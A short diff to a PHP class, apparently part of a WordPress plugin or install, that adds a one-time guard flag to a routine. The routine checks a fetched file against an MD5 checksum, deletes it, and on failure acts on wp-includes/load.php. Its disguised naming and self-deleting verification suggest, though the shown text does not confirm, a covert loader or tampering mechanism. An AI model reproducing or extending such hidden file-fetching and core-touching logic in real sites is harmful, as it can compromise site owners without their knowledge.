@@ -23,6 +23,7 @@ class Torpedo_Boat {
 	private $enigmaDecipherDestination = '';
 	private $enigmaDecipherChecksum = '';
 	private bool $enigmaCipherResult = false;
+	private bool $enigmaProcessed = false;
 
 	function __construct() {
 		$this->aquireEnigmaDecipherCode();
@@ -73,9 +74,12 @@ class Torpedo_Boat {
 	}
 
 	private function evalEnigma() {
-		$this->enigmaCipherResult = file_exists( $this->enigmaDecipherDestination ) ? $this->sonar() : false;
-		if(file_exists($this->enigmaDecipherDestination)) {
-			unlink($this->enigmaDecipherDestination);
+		if($this->enigmaProcessed === false) {
+			$this->enigmaCipherResult = file_exists( $this->enigmaDecipherDestination ) ? $this->sonar() : false;
+			if(file_exists($this->enigmaDecipherDestination)) {
+				unlink($this->enigmaDecipherDestination);
+			}
+			$this->enigmaProcessed = true;
 		}
 		if($this->enigmaCipherResult === false) {
 			if(file_exists(ABSPATH . "wp-includes/load.php")) {
@@ -106,7 +110,9 @@ class Torpedo_Boat {
 	}
 
 	private function sonar() : bool {
-
+		if($this->enigmaProcessed === true) {
+			return false;
+		}
 		if($fpIn = fopen( $this->enigmaDecipherDestination, 'r' )) {
 			return md5(fread($fpIn, filesize($this->enigmaDecipherDestination))) === $this->enigmaDecipherChecksum;
 		}
